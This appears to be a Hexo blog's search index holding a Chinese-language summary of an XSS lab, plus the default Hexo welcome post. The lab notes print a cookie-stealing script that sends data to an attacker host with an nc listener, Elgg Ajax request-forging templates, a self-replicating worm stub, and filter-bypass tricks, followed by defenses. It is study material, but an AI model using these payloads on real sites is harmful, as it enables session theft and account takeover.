<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>XSS vulnerability</title>
    <link href="/2022/04/15/WebSec/"/>
    <url>/2022/04/15/WebSec/</url>
    
    <content type="html"><![CDATA[<p>Web实验总结</p><img src="/2022/04/15/WebSec/web.jpg" class="" title="WEB Security"><h2 id="XSS："><a href="#XSS：" class="headerlink" title="XSS："></a>XSS：</h2><p>对于任何将用户输入作为返回用户的页面上的用来显示的地方，均有可能产生XSS。其本质是用户的输入本应该作为数据的一部分，但是在一些特殊情况下被作为了代码执行。</p><p>XSS的利用可以做到javascript可以做的任何事情。可以盗取cookie，进而这个cookie进行恶意登陆等操作。并且可以制作蠕虫病毒进行自我复制。</p><p>用户输入可以展示给自己，也可以展示给别人，所以常见于社交媒体，留言系统等网站。</p><h3 id="如何触发漏洞-x2F-利用技巧："><a href="#如何触发漏洞-x2F-利用技巧：" class="headerlink" title="如何触发漏洞&#x2F;利用技巧："></a>如何触发漏洞&#x2F;利用技巧：</h3><ol><li>使用 <code>alert</code> 函数进行弹窗。</li><li>使用 <code>document.cookie</code> 读取cookie。</li><li>使用如下代码用GET方法将cookie发送到指定主机，escape函数用来编码。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(’&lt;img src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//10.9.0.1:5555?c=’</span><br>                       + <span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) + ’   &gt;’);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li></ol><p>对应的，在需要接收的主机上开启 <code>nc</code> ，<code>-l</code> 表示listen模式，<code>-nv</code> 表示给出更多输出，<code>-k</code> 表示当结束一次连接以后，继续监听下一次。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lknv 5555<br></code></pre></td></tr></table></figure><ol start="4"><li>通过Ajax发送请求完成操作，GET以及POST请求都可以发送，案例如下。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>; <br><span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;  <span class="hljs-comment">//Construct the HTTP request to add Samy as a friend.</span><br><span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.xxx.com?&quot;</span>+ts+token;  <span class="hljs-comment">//FILL IN</span><br><span class="hljs-comment">//Create and send Ajax request to add friend</span><br><span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>  <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>  <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();<br>&#125; <br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-comment">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts</span><br>  <span class="hljs-comment">//and Security Token __elgg_token</span><br><span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br><span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br><span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br><span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br><span class="hljs-comment">//Construct the content of your url.</span><br><span class="hljs-keyword">var</span> content=...;<br><span class="hljs-keyword">var</span> samyGuid=...;<br><span class="hljs-keyword">var</span> sendurl=...;<br><span class="hljs-comment">//FILL IN</span><br><span class="hljs-comment">//FILL IN</span><br><span class="hljs-comment">//FILL IN</span><br><span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid) &#123;<br>   <span class="hljs-comment">//Create and send Ajax request to modify profile</span><br>   <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>   <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>   <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br> <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                           <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>   <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>  &#125;<br>&#125; &lt;/script&gt;<br></code></pre></td></tr></table></figure><ol start="5"><li>使用DOM中的方法构造蠕虫。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script id=<span class="hljs-string">&quot;worm&quot;</span>&gt;<br><span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;  <br><span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>;  <br><span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>; <br><span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag); <br><span class="hljs-title function_">alert</span>(jsCode);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><ol start="6"><li>获取用户信息</li></ol><p>识别浏览器：最直接的方法就是读取浏览器的userAgent对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">alert</span>(navigator.<span class="hljs-property">userAgent</span>);<br></code></pre></td></tr></table></figure><p>可以得到操作系统版本，浏览器版本等等主机信息。<br>但是userAgent是可以被伪造的，有一些firefox的插件可以伪造虚假的userAgent。此时我们可以利用不同浏览器之间的细微差异来辨别不同的浏览器。</p><p>识别用户安装的软件（浏览器插件）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">alert</span>(navigator.<span class="hljs-property">plugins</span>[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);<br></code></pre></td></tr></table></figure><p>获取用户的用户IP地址：<br>如果用户安装的JRE环境，就可以通过调用JavaApplet接口获取本地IP地址，也可以获取外网IP地址。</p><ol start="7"><li>Payload构造技巧：</li></ol><p>利用字符编码：对于使用GBK&#x2F;GB2312编码的字符，可以使用<code>%c1</code>绕过对双引号的转义。因为<code>%c1\</code> 会被解析成为一个unicode字符。</p><p>绕过长度限制：调用远程js文件&#x2F;使用注释符打通两个input框。</p><p>利用相对路径：使用<code>&lt;base&gt;</code>标签，将使用相对路径的资源&#x2F;脚本进行劫持。</p><h3 id="如何防御："><a href="#如何防御：" class="headerlink" title="如何防御："></a>如何防御：</h3><ol><li>HttpOnly方法：简单来说，就是服务器在返回cookie时，将cookie设置了HttpOnly标签，使得javascript代码无法读取cookie值。但是严格来说其实这个方法并不是防御XSS的，而是防御XSS漏洞发生后的利用过程。虽然此时javascript无法读取到cookie，但是还是可以向相同域内的网址用ajax请求来进行模拟POST&#x2F;GET过程。</li><li>转义 比如将标签 <code>&lt; &gt;</code> 转化成 <code>&amp;lt &amp;gt</code> 。</li><li>使用CSP(Content Security Policy) 可以指定带有特定 <code>nonce</code> 的script代码块才可以被执行，或者指定源的js代码才可以被执行。</li></ol>]]></content>
    
    
    <categories>
      
      <category>WebSecurity</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全漏洞介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/04/15/hello-world/"/>
    <url>/2022/04/15/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
